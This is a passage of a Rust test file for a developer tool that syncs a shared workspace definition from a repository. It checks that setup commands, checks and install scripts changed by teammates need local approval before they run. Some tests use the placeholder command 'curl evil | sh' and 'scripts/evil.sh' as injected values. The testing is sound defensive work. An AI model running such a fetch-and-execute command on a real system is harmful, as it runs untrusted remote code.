    let def = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert_eq!((def.worktree_copy.clone(), def.worktree_setup.clone()), (None, None));
    let text = serde_json::to_string(&def).unwrap();
    assert!(!text.contains("worktree"), "not written when absent: {text}");

    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "someone", "c1");
    let report = fx.refresh(&repo);
    assert!(!report.changes.iter().any(|c| c.field.starts_with("worktree")), "{:?}", report.changes);
    // 1.175.0 B2: the file now holds this Mac's record for the checks and the
    // install step the definition brought (`checks_consent`), and still no
    // worktree setting.
    let written = crate::worktree_setup::load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(
        (written.worktree_copy, written.worktree_setup, written.env_proposal, written.approved_setup),
        (None, None, None, None),
        "no worktree setting is written for nothing"
    );
    // An empty list and an empty command read as none, like absent ones.
    let empty = r#"{ "name": "Shared", "board": "local", "worktreeCopy": [], "worktreeSetup": " " }"#;
    repo.put("main", DEFINITION_PATH, empty, "someone", "c2");
    let report = fx.refresh(&repo);
    assert!(!report.changes.iter().any(|c| c.field.starts_with("worktree")), "{:?}", report.changes);
}

#[test]
fn a_local_worktree_edit_is_kept_as_pending_for_the_repo() {
    use crate::worktree_setup::{load_settings, save_settings, EnvProposalAnswer};
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, r#"{ "name": "Shared", "board": "local" }"#, "someone", "c1");
    fx.refresh(&repo);

    // The "Copy them" answer: this Mac's store, then the recorded edit.
    let mut settings = load_settings(&fx.configs, &fx.ws_id);
    crate::worktree_setup::answer_env_proposal(&mut settings, EnvProposalAnswer::Copy, &[".env".into()])
        .unwrap();
    save_settings(&fx.configs, &fx.ws_id, &settings).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    assert_eq!(view.cache.pending.get("worktreeCopy"), Some(&serde_json::json!([".env"])));
    assert!(!view.cache.pending.contains_key("envProposal"), "the answer itself is never shared");
    assert!(view.queue.fields.contains_key("worktreeCopy"));

    // A refresh while it waits keeps it; the repo carrying it settles it.
    fx.refresh(&repo);
    assert_eq!(load_settings(&fx.configs, &fx.ws_id).copy_entries(), [".env".to_string()]);
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local", "worktreeCopy": [".env"] }"#,
        "me",
        "c2",
    );
    let report = fx.refresh(&repo);
    assert!(report.pending_fields.is_empty(), "{:?}", report.pending_fields);
}

#[test]
fn a_setup_command_edited_here_is_allowed_here_and_a_teammates_is_not() {
    use crate::worktree_setup::load_settings;
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, r#"{ "name": "Shared", "board": "local" }"#, "someone", "c1");
    fx.refresh(&repo);
    // Another field's save whose draft carries a command nobody typed in its
    // row: applied, never approved (review 2, #2).
    let mut def = fx.cache().unwrap().definition.unwrap();
    def.name = "Renamed".into();
    def.worktree_setup = Some("curl evil | sh".into());
    save_with(&fx.stores(), &repo, &fx.ws_id, def, false).unwrap();
    let local = load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(local.setup_command(), Some("curl evil | sh"));
    assert_eq!(local.approved_setup, None, "not approved by a save of another field");
    assert!(!local.setup_allowed());
    // The page's publish of the setup row: this Mac typed it.
    let mut def = fx.cache().unwrap().definition.unwrap();
    def.worktree_setup = Some("npm ci".into());
    save_with(&fx.stores(), &repo, &fx.ws_id, def, true).unwrap();
    let local = load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(local.setup_command(), Some("npm ci"));
    assert!(local.setup_allowed(), "typed here, allowed here");
    // The publish lands; then a teammate changes it on the branch: this Mac
    // runs the new one only once allowed.
    repo.put("main", DEFINITION_PATH, r#"{ "name": "Shared", "board": "local", "worktreeSetup": "npm ci" }"#, "me", "c2");
    fx.refresh(&repo);
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local", "worktreeSetup": "curl evil | sh" }"#,
        "teammate",
        "c3",
    );
    fx.refresh(&repo);
    let local = load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(local.setup_command(), Some("curl evil | sh"));
    assert!(!local.setup_allowed());
    assert_eq!(local.approved_setup.as_deref(), Some("npm ci"), "the refresh never allows");
}

// ── 1.175.0 B2 (SEC-4): checks and install step from the branch ask ────

const CHECKS_A: &str = r#"{ "name": "Shared", "board": "local", "integrationBranch": "main",
  "verifyPipeline": [{ "kind": "script", "path": "scripts/check.sh" }], "installScript": "scripts/install.sh" }"#;
const CHECKS_B: &str = r#"{ "name": "Shared", "board": "local", "integrationBranch": "main",
  "verifyPipeline": [{ "kind": "script", "path": "scripts/check.sh" },
                     { "kind": "slash_command", "name": "/ppvp", "args": ["then tidy the release folder"] }],
  "installScript": "scripts/deploy-all.sh" }"#;

/// The migration, case 1 and 2: a computer updated to 1.175.0 has no record
/// (its `worktree_setup.json` is 1.174.5's). What it runs is allowed and
/// nothing asks at the update; the first value that then comes from the
/// branch asks, with what ran until then written down as the allowed one.
#[test]
fn after_the_update_the_values_in_use_run_and_a_later_change_from_the_branch_asks() {
    use crate::checks_consent::{checks_allowed, install_allowed, view};
    use crate::worktree_setup::load_settings;
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, CHECKS_A, "me", "c1");
    fx.refresh(&repo);
    // 1.174.5 left the values in use and no record of an OK.
    let mut old = load_settings(&fx.configs, &fx.ws_id);
    (old.approved_verify, old.approved_install, old.verify_changed, old.install_changed) = (None, None, None, None);
    crate::worktree_setup::save_settings(&fx.configs, &fx.ws_id, &old).unwrap();
    let fx = fx.restart();
    fx.refresh(&repo);
    assert!(checks_allowed(&fx.configs, &fx.ws_id), "nothing asks at the update");
    assert!(install_allowed(&fx.configs, &fx.ws_id));
    // Round 2 (G5): the first refresh on this build writes down what ran
    // until then — the value already in this computer's cache — as allowed.
    let recorded = load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(recorded.approved_verify.unwrap().steps.iter().map(|s| s.text.clone()).collect::<Vec<_>>(), ["scripts/check.sh"]);
    assert_eq!(recorded.approved_install.unwrap().path.as_deref(), Some("scripts/install.sh"));
    assert_eq!(recorded.verify_changed, None);

    // A teammate changes both on the branch.
    repo.put("main", DEFINITION_PATH, CHECKS_B, "example-teammate", "c2");
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().install_script.as_deref(), Some("scripts/deploy-all.sh"), "repo wins, as before");
    assert!(!checks_allowed(&fx.configs, &fx.ws_id), "but it doesn't run");
    assert!(!install_allowed(&fx.configs, &fx.ws_id));
    let seen = view(&fx.configs, &fx.ws_id);
    assert!(seen.checks.needs_ok && !seen.checks.first_time);
    assert_eq!(seen.checks.approved.iter().map(|s| s.text.as_str()).collect::<Vec<_>>(), ["scripts/check.sh"]);
    assert_eq!(seen.checks.current.len(), 2);
    assert!(seen.checks.current[1].claude);
    assert_eq!(seen.checks.current[1].args.as_deref(), Some("then tidy the release folder"));
    assert_eq!(seen.checks.who.as_deref(), Some("example-teammate"));
    assert_eq!(seen.install.approved.as_deref(), Some("scripts/install.sh"));
    assert_eq!(seen.install.current.as_deref(), Some("scripts/deploy-all.sh"));

    // Across a restart too; and the OK is for what was shown.
    let fx = fx.restart();
    fx.refresh(&repo);
    assert!(!checks_allowed(&fx.configs, &fx.ws_id));
    crate::checks_consent::approve_checks(&fx.configs, &fx.ws_id, &seen.checks.hash).unwrap();
    assert!(checks_allowed(&fx.configs, &fx.ws_id));
    assert!(!install_allowed(&fx.configs, &fx.ws_id), "the checks' OK isn't the install step's");
    // A release now: it is held and remembered, never started.
    assert!(crate::checks_consent::hold_install(&fx.configs, &fx.ws_id, Some("v1.4.0")));
    assert_eq!(view(&fx.configs, &fx.ws_id).install.waiting.and_then(|w| w.tag).as_deref(), Some("v1.4.0"));
    let waiting = crate::checks_consent::approve_install(&fx.configs, &fx.ws_id, "scripts/deploy-all.sh").unwrap();
    assert_eq!(waiting.and_then(|w| w.tag).as_deref(), Some("v1.4.0"));
    assert!(!crate::checks_consent::hold_install(&fx.configs, &fx.ws_id, Some("v1.4.1")));

    // The teammate puts the old checks back: they aren't the allowed ones any more.
    repo.put("main", DEFINITION_PATH, CHECKS_A, "example-teammate", "c3");
    fx.refresh(&repo);
    assert!(!checks_allowed(&fx.configs, &fx.ws_id), "this Mac allowed the two-step checks, not these");
}

/// Round 2 (G4), failed before the fix: a teammate pushes changed checks
/// (held, correctly), then pushes the shared file **without** its project
/// part. The second refresh applies nothing, this Mac's config keeps the
/// value nobody allowed, and "shared" turns false — which switched the gate
/// off, so the next Finish and check ran it with no question. A record,
/// once it exists, is enforced whatever the shared file says now.
#[test]
fn g4_the_gate_stays_on_when_the_shared_file_loses_its_project_part() {
    use crate::checks_consent::{checks_allowed, install_allowed, view};
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, CHECKS_A, "me", "c1");
    fx.refresh(&repo);
    crate::checks_consent::approve_own(&fx.configs, &fx.ws_id, true, true);
    // Push 1: changed checks and install step. Held.
    repo.put("main", DEFINITION_PATH, CHECKS_B, "mallory", "c2");
    fx.refresh(&repo);
    assert!(!checks_allowed(&fx.configs, &fx.ws_id));
    assert!(!install_allowed(&fx.configs, &fx.ws_id));
    // Push 2: the same file without its project fields.
    repo.put("main", DEFINITION_PATH, r#"{ "name": "Shared", "board": "local" }"#, "mallory", "c3");
    fx.refresh(&repo);
    let config = fx.configs.get(&fx.ws_id).expect("this Mac's config stays");
    assert_eq!(config.install_script.as_deref(), Some("scripts/deploy-all.sh"), "the unapproved value is still what would run");
    assert_eq!(config.verify_pipeline.as_ref().map(Vec::len), Some(2));
    assert!(!fx.cache().unwrap().definition.unwrap().has_project(), "the shared file has no project part now");
    assert!(!checks_allowed(&fx.configs, &fx.ws_id), "and it still doesn't run unasked");
    assert!(!install_allowed(&fx.configs, &fx.ws_id));
    assert!(crate::checks_consent::hold_install(&fx.configs, &fx.ws_id, Some("v9")));
    let seen = view(&fx.configs, &fx.ws_id);
    assert!(seen.checks.needs_ok && seen.install.needs_ok);
    // Across a restart too.
    let fx = fx.restart();
    assert!(!checks_allowed(&fx.configs, &fx.ws_id));
    // A change the person makes on this Mac still allows itself…
    let before = crate::checks_consent::in_use(&fx.configs, &fx.ws_id);
    let mut mine = fx.configs.get(&fx.ws_id).unwrap();
    mine.verify_pipeline = Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }]);
    fx.configs.set(&fx.ws_id, mine).unwrap();
    crate::checks_consent::approve_own_edit(&fx.configs, &fx.ws_id, &before);
    assert!(checks_allowed(&fx.configs, &fx.ws_id));
    // …and the install step, which it didn't touch, still waits.
    assert!(!install_allowed(&fx.configs, &fx.ws_id));
}

/// The migration, case 3: a new clone has nothing in use, so the
/// repository's checks ask the first time, with one list and nobody named.
#[test]
fn a_new_clone_asks_the_first_time_its_checks_would_run() {
    use crate::checks_consent::{checks_allowed, install_allowed, view};
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, CHECKS_B, "example-teammate", "c1");
    let report = fx.refresh(&repo);
    assert!(report.first_read);
    assert!(!checks_allowed(&fx.configs, &fx.ws_id));
    assert!(!install_allowed(&fx.configs, &fx.ws_id));
    let seen = view(&fx.configs, &fx.ws_id);
    assert!(seen.checks.needs_ok && seen.checks.first_time);
    assert!(seen.checks.approved.is_empty());
    assert_eq!(seen.checks.who, None, "a first read follows nobody's edit");
    assert_eq!(seen.install.approved, None);
    assert!(seen.install.first_time);

    // Round 2 (G5): a new clone whose own detection found the very checks
    // the repository shares. Nothing changes at the read, and it still asks
    // the first time: nobody here was shown them as the repository's.
    let fx = Fixture::new();
    let mut detected = fx.configs.get(&fx.ws_id).unwrap_or_else(|| ProjectConfig {
        schema_version: PROJECT_CONFIG_SCHEMA_VERSION,
        target_branch: "main".into(),
        version_files: Vec::new(),
        install_script: None,
        try_command: None,
        verify_pipeline: None,
        verify_script: None,
        cache_paths: Vec::new(),
        shared_build_cache: true,
        self_check: true,
        review_checklist: Vec::new(),
        blocking_findings: Default::default(),
        created_at: 0,
        updated_at: 0,
    });
    detected.verify_pipeline = Some(vec![VerifyKind::Script { path: "scripts/check.sh".into() }]);
    detected.install_script = Some("scripts/install.sh".into());
    fx.configs.set(&fx.ws_id, detected).unwrap();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, CHECKS_A, "example-teammate", "c1");
    let report = fx.refresh(&repo);
    assert!(report.first_read);
    assert!(!report.changes.iter().any(|c| c.field == "verifyPipeline"), "{:?}", report.changes);
    assert!(!checks_allowed(&fx.configs, &fx.ws_id), "the same value, never shown here as the repository's: it asks");
    assert!(view(&fx.configs, &fx.ws_id).checks.first_time);
}

/// A change made on this computer allows itself (the page's Publish), and a
/// save of another field never allows checks it happens to carry.
#[test]
fn checks_changed_on_this_mac_are_allowed_here_and_ask_on_the_others() {
    use crate::checks_consent::{checks_allowed, install_allowed};
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, CHECKS_A, "me", "c1");
    fx.refresh(&repo);
    crate::checks_consent::approve_own(&fx.configs, &fx.ws_id, true, true);
    assert!(checks_allowed(&fx.configs, &fx.ws_id));

    // The page publishes new checks: base → draft differ on them.
    let base = to_map(&fx.cache().unwrap().definition.unwrap());
    let mut draft = base.clone();
    draft.insert("verifyPipeline".into(), serde_json::json!([{ "kind": "script", "path": "scripts/mine.sh" }]));
    save_changes_with(&fx.stores(), &repo, &fx.ws_id, base.clone(), draft, false).unwrap();
    assert!(checks_allowed(&fx.configs, &fx.ws_id), "written here, allowed here");
    assert_eq!(
        crate::worktree_setup::load_settings(&fx.configs, &fx.ws_id).approved_verify.unwrap().steps[0].text,
        "scripts/mine.sh"
    );

    // Another field's save from a stale page, carrying an install step nobody
    // typed there: applied (the editor's rule), never allowed.
    let mut def = fx.cache().unwrap().definition.unwrap();
    def.verify_pipeline = Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }]);
    def.install_script = Some("scripts/evil.sh".into());
    save_with(&fx.stores(), &repo, &fx.ws_id, def, false).unwrap();
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().install_script.as_deref(), Some("scripts/evil.sh"));
    assert!(!install_allowed(&fx.configs, &fx.ws_id), "not allowed by a save of another field");
}

/// T6: a report from before `firstRead` reads as not first.
#[test]
fn a_refresh_report_without_first_read_loads_as_not_first() {
    let old = serde_json::json!({
        "workspaceId": "w", "moment": "periodic", "hasDefinition": true, "source": "repo",
        "branch": "main", "author": "a", "commit": "c", "changes": [], "unreadable": null,
        "fetchError": null, "pendingFields": [], "pendingState": null
    });
    let report: RefreshReport = serde_json::from_value(old).unwrap();
    assert!(!report.first_read);
}

/// Publish-sheet walk (Challenger): a publish-now press waits for the
/// workspace lock only so long, then says why; a free lock is taken at once.
#[test]
fn a_publish_now_press_waits_for_a_held_workspace_lock_only_so_long() {
    let lock = std::sync::Mutex::new(());
    assert!(super::lock_within(&lock, std::time::Duration::from_millis(10)).is_some());
    let held = lock.lock().unwrap();
    let started = std::time::Instant::now();
    assert!(super::lock_within(&lock, std::time::Duration::from_millis(120)).is_none());
    assert!(started.elapsed() >= std::time::Duration::from_millis(120));
    drop(held);
    assert!(super::lock_within(&lock, std::time::Duration::from_millis(10)).is_some());
    assert!(super::PUBLISH_BUSY_WORDS.contains("nothing was published"));
}

// ── Skills hub H9: `library.plySkills` ─────────────────────────────────

/// Tier 2 (§5.9): a definition without `library` — every one written
/// before H9 — loads, chooses nothing, and compares equal to "no choices".
#[test]
fn a_definition_without_library_loads_and_chooses_nothing() {
    let def = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert!(def.library.is_none());
    let mut chosen = def.clone();
    chosen.library = Some(DefinitionLibrary { ply_skills: Some(Default::default()), extra: BTreeMap::new() });
    assert_eq!(def.normalized("main"), chosen.normalized("main"));
    assert!(DefinitionLibrary::choices(def.library.as_ref()).is_empty());
    // An older file with a later `library` key of its own: kept in `extra`
    // of the library, and the Plyloft choices still read.
    let later = PLY_DEFINITION.replace(
        "\"installScript\"",
        "\"library\": { \"plySkills\": { \"off\": [\"card-brief\"] }, \"later\": 1 },\n  \"installScript\"",
    );
    let def = parse_definition(later.as_bytes()).unwrap();
    let library = def.library.clone().unwrap();
    assert_eq!(library.extra.get("later"), Some(&serde_json::json!(1)));
    assert_eq!(DefinitionLibrary::choices(def.library.as_ref()).off, vec!["card-brief".to_string()]);
}

/// The repository's choices reach this Mac's `ply_skills.json` on a refresh,
/// with a toast naming the field and its author; a local edit is queued for
/// the branch and publishes over the file without dropping `library`'s
/// other keys.
#[test]
fn plyloft_choices_travel_with_the_definition() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let with = |text: &str| {
        PLY_DEFINITION.replace("\"installScript\"", &format!("\"library\": {text},\n  \"installScript\""))
    };
    repo.put("main", DEFINITION_PATH, &with(r#"{ "plySkills": { "off": ["card-brief"], "on": [] }, "later": 1 }"#), "matteo", "c1");
    let report = fx.refresh(&repo);
    let change = report.changes.iter().find(|c| c.field == "library").expect("a change of library");
    assert_eq!(change.label, "Plyloft skills in this workspace");
    let choices = crate::ply_skill_switch::load(&fx.configs, &fx.ws_id);
    assert_eq!(choices.off, vec!["card-brief".to_string()]);

    // A second refresh with nothing new changes nothing.
    assert!(fx.refresh(&repo).changes.iter().all(|c| c.field != "library"));

    // This Mac switches release-notes on here: applied at once and queued.
    crate::ply_skill_switch::save(&fx.configs, &fx.ws_id, &choices.with("release-notes", Some(true))).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let queued = &fx.queue().fields["library"];
    assert_eq!(queued.value["plySkills"]["on"], serde_json::json!(["release-notes"]));
    // The file a publish writes keeps `library.later`.
    let cache = fx.cache().unwrap();
    let fields: BTreeMap<String, Value> = [("library".to_string(), queued.value.clone())].into_iter().collect();
    let text = file_text(cache.definition.as_ref().unwrap(), None, &fields, "main");
    let written = parse_definition(text.as_bytes()).unwrap();
    let library = written.library.unwrap();
    assert_eq!(library.extra.get("later"), Some(&serde_json::json!(1)), "{text}");
    assert_eq!(library.ply_skills.unwrap().on, vec!["release-notes".to_string()]);

    // The repository taking the other side wins on the next refresh, once
    // the pending edit is gone (here: a second Mac with no edit).
    let other = Fixture::new();
    repo.put("main", DEFINITION_PATH, &with(r#"{ "plySkills": { "off": [], "on": ["card-brief"] } }"#), "ana", "c2");
    other.refresh(&repo);
    assert_eq!(crate::ply_skill_switch::load(&other.configs, &other.ws_id).choice("card-brief"), Some(true));
}

// ── A workspace's own name (owner, 2026-10-20) ─────────────────────────

/// The definition with another Name, as a teammate's rename leaves it.
fn named(name: &str) -> String {
    PLY_DEFINITION.replace("\"name\": \"Ply\"", &format!("\"name\": \"{name}\""))
}

fn labels(report: &RefreshReport) -> Vec<String> {
    report.changes.iter().map(|c| c.label.clone()).collect()
}

#[test]
fn a_folder_named_workspace_takes_the_shared_name_and_a_later_shared_rename() {
    let fx = Fixture::new();
    assert_eq!(fx.ws().name_chosen, Some(false), "named after its folder");
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    let report = fx.refresh(&repo);
    assert!(labels(&report).contains(&"Name".to_string()), "{:?}", labels(&report));
    assert_eq!(fx.ws().name, "Ply");
    repo.put("main", DEFINITION_PATH, &named("Plyloft"), "ana", "c2");
    let report = fx.refresh(&repo);
    assert_eq!(labels(&report), vec!["Name"]);
    assert_eq!(fx.ws().name, "Plyloft");
    assert_eq!(fx.ws().name_chosen, Some(false), "applying a name never marks it the person's");
}

#[test]
fn a_workspace_added_with_a_name_keeps_it_on_apply_and_on_a_later_shared_rename() {
    let fx = Fixture::new();
    let cwd = fx.ws().cwd.clone();
    let mine = fx.workspaces.create("My Ply".into(), format!("{cwd}-mine")).unwrap();
    assert_eq!(mine.name_chosen, Some(true), "added with a name other than its folder's");
    std::fs::create_dir_all(&mine.cwd).unwrap();
    let fx = Fixture { ws_id: mine.id.clone(), ..fx };
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    let report = fx.refresh(&repo);
    assert!(report.has_definition);
    // Everything else is applied without asking; the Name isn't, nor listed.
    assert!(!labels(&report).contains(&"Name".to_string()), "{:?}", labels(&report));
    assert!(labels(&report).contains(&"Board".to_string()), "{:?}", labels(&report));
    assert_eq!(fx.ws().name, "My Ply");
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#7c3aed"));

    // A teammate renames it on the branch: still this workspace's own name.
    repo.put("main", DEFINITION_PATH, &named("Plyloft"), "ana", "c2");
    let report = fx.refresh(&repo);
    assert!(report.changes.is_empty(), "{:?}", report.changes);
    assert_eq!(fx.ws().name, "My Ply");

    // An unrelated edit here never publishes the own name over theirs.
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#000000".into())).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    assert_eq!(view.cache.pending.keys().collect::<Vec<_>>(), vec!["accentColor"]);
    assert_eq!(view.effective.unwrap().name, "Plyloft", "the shared Name, as the Repository page shows it");
}

#[test]
fn a_rename_here_is_the_person_s_name_published_once_and_kept_after_a_teammate_s_rename() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.ws().name, "Ply");

    // `workspace_rename`: the rename is the person's, and gives everyone the Name.
    fx.workspaces.rename_by_user(&fx.ws_id, "Mine".into()).unwrap();
    assert_eq!(fx.ws().name_chosen, Some(true));
    let view = record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Mine".into()))
        .unwrap()
        .unwrap();
    assert_eq!(view.cache.pending.get("name"), Some(&Value::from("Mine")));
    // The branch carries it; then a teammate renames.
    repo.put("main", DEFINITION_PATH, &named("Mine"), "me", "c2");
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().pending.is_empty());
    repo.put("main", DEFINITION_PATH, &named("Theirs"), "ana", "c3");
    let report = fx.refresh(&repo);
    assert!(report.changes.is_empty(), "{:?}", report.changes);
    assert_eq!(fx.ws().name, "Mine");
    // And a later edit of another field leaves their Name on the branch.
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#000000".into())).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    assert!(!view.cache.pending.contains_key("name"), "{:?}", view.cache.pending);
}

#[test]
fn a_read_only_rename_stays_on_this_mac_and_is_not_refused() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    *repo.permission.borrow_mut() = Some(false);
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename_by_user(&fx.ws_id, "Mine".into()).unwrap();
    let view = record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Mine".into()))
        .unwrap()
        .unwrap();
    assert!(view.cache.pending.is_empty(), "{:?}", view.cache.pending);
    assert_eq!(fx.ws().name, "Mine");
    fx.refresh(&repo);
    assert_eq!(fx.ws().name, "Mine");
}

#[test]
fn the_repository_page_s_name_on_a_person_named_workspace_publishes_it_without_renaming_here() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename_by_user(&fx.ws_id, "Mine".into()).unwrap();
    repo.put("main", DEFINITION_PATH, &named("Ply"), "ana", "c2");
    // A save of another field: the page's Name (the shared one) is not applied here.
    let base = to_map(&get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap());
    let mut draft = base.clone();
    draft.insert("accentColor".into(), Value::from("#111111"));
    let view = save_changes(&fx.stores(), &repo, &fx.ws_id, base.clone(), draft).unwrap();
    assert_eq!(fx.ws().name, "Mine");
    assert!(!view.cache.pending.contains_key("name"), "{:?}", view.cache.pending);
    // The page's Name edited: everyone's Name, published; this one stays.
    let base = to_map(&view.effective.unwrap());
    let mut draft = base.clone();
    draft.insert("name".into(), Value::from("Plyloft"));
    let view = save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    assert_eq!(view.cache.pending.get("name"), Some(&Value::from("Plyloft")));
    assert_eq!(fx.ws().name, "Mine");
}

/// Schema migration: a `workspaces.json` from before `nameChosen` loads with
/// it unset, writes nothing new for it, and reads the name: one that is
/// neither its folder's nor the shared Name last read is the person's.
#[test]
fn a_workspace_from_before_name_chosen_reads_its_name_and_keeps_its_file_shape() {
    let old = r#"{ "workspaces": [
        { "id": "a", "name": "repo", "cwd": "/x/repo", "createdAt": 0, "lastOpenedAt": 0 },
        { "id": "b", "name": "My repo", "cwd": "/x/repo", "createdAt": 0, "lastOpenedAt": 0 }
    ], "activeWorkspaceId": null }"#;
    let file: WorkspacesFile = serde_json::from_str(old).unwrap();
    let [folder, mine] = [&file.workspaces[0], &file.workspaces[1]];
    assert_eq!(folder.name_chosen, None);
    assert!(!serde_json::to_string(folder).unwrap().contains("nameChosen"));
    let shared = |name: &str| parse_definition(format!(r#"{{ "name": "{name}" }}"#).as_bytes()).unwrap();
    assert!(!keeps_own_name(folder, None), "its folder's name");
    assert!(keeps_own_name(mine, None), "a name of its own, before any definition");
    assert!(!keeps_own_name(mine, Some(&shared("My repo"))), "the shared Name a refresh applied");
    assert!(keeps_own_name(mine, Some(&shared("Other"))));
    // Marked, the mark decides and is written.
    let mut marked = mine.clone();
    marked.name_chosen = Some(false);
    assert!(!keeps_own_name(&marked, None));
    assert!(serde_json::to_string(&marked).unwrap().contains("\"nameChosen\":false"));
}

/// A workspace from before `nameChosen` keeps what its first read decides: a
/// rename an older version left pending stays its own after it reaches the
/// branch, so a teammate's later rename doesn't take it; one that followed
/// the shared Name keeps following it.
#[test]
fn a_workspace_from_before_the_mark_keeps_what_its_first_read_decided() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c1");
    fx.workspaces.set_name_chosen(&fx.ws_id, None).unwrap();
    fx.refresh(&repo);
    assert_eq!((fx.ws().name.as_str(), fx.ws().name_chosen), ("Ply", Some(false)), "it followed the shared Name");

    // An older version renamed it and queued the Name; no mark was written.
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    fx.workspaces.set_name_chosen(&fx.ws_id, None).unwrap();
    record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Mine".into())).unwrap().unwrap();
    fx.refresh(&repo);
    assert_eq!(fx.ws().name_chosen, Some(true), "a name of its own, decided once");
    assert_eq!(fx.cache().unwrap().pending.get("name"), Some(&Value::from("Mine")), "still published");
    // The branch carries it; then a teammate renames: still its own.
    repo.put("main", DEFINITION_PATH, &named("Mine"), "me", "c2");
    fx.refresh(&repo);
    repo.put("main", DEFINITION_PATH, &named("Theirs"), "ana", "c3");
    let report = fx.refresh(&repo);
    assert!(report.changes.is_empty(), "{:?}", report.changes);
    assert_eq!(fx.ws().name, "Mine");
}

// ── Try it: `tryCommand` (TRY_IT_SPEC §5.1, D19) ───────────────────────

/// Tier 2: a definition from before Try it loads with no start command; a
/// pretty-written one re-serialises byte for byte; `tryCommand` round-trips;
/// a value of the wrong type reads as unset and the file stays usable.
#[test]
fn a_definition_from_before_try_it_loads_without_a_start_command() {
    let def = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert_eq!(def.try_command, None);
    assert!(def.extra.is_empty(), "no key of its own was taken for an unknown one");
    let written = serde_json::to_string_pretty(&def).unwrap();
    assert!(!written.contains("tryCommand"), "{written}");
    assert_eq!(
        serde_json::to_string_pretty(&parse_definition(written.as_bytes()).unwrap()).unwrap(),
        written,
        "an untouched definition is written as it was"
    );

    let with = PLY_DEFINITION.replace(
        "\"verifyPipeline\"",
        "\"tryCommand\": \"npm run dev\",\n  \"verifyPipeline\"",
    );
    let def = parse_definition(with.as_bytes()).unwrap();
    assert_eq!(def.try_command.as_deref(), Some("npm run dev"));
    assert!(serde_json::to_string_pretty(&def).unwrap().contains("\"tryCommand\": \"npm run dev\""));
    // Blank means none once normalized, as absent does.
    let mut blank = def.clone();
    blank.try_command = Some("  ".into());
    assert_eq!(blank.normalized("main").try_command, None);

    for bad in ["5", "true", "[\"npm\"]", "{}"] {
        let text = PLY_DEFINITION.replace(
            "\"verifyPipeline\"",
            &format!("\"tryCommand\": {bad},\n  \"verifyPipeline\""),
        );
        let def = parse_definition(text.as_bytes())
            .unwrap_or_else(|e| panic!("{bad}: the definition must stay usable: {e:?}"));
        assert_eq!(def.try_command, None, "{bad}");
        assert_eq!(def.install_script.as_deref(), Some("scripts/install-local.sh"));
    }
}

/// The repository's start command reaches this Mac's config on a refresh,
/// named in the toast; it is never approved by the refresh. A local change
/// is queued for the branch like `installScript`.
#[test]
fn the_start_command_travels_with_the_definition_and_is_approved_per_mac() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let with = |cmd: &str| {
        PLY_DEFINITION.replace(
            "\"verifyPipeline\"",
            &format!("\"tryCommand\": \"{cmd}\",\n  \"verifyPipeline\""),
        )
    };
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "matteo", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command, None);

    repo.put("main", DEFINITION_PATH, &with("npm run dev"), "teammate", "c2");
    let report = fx.refresh(&repo);
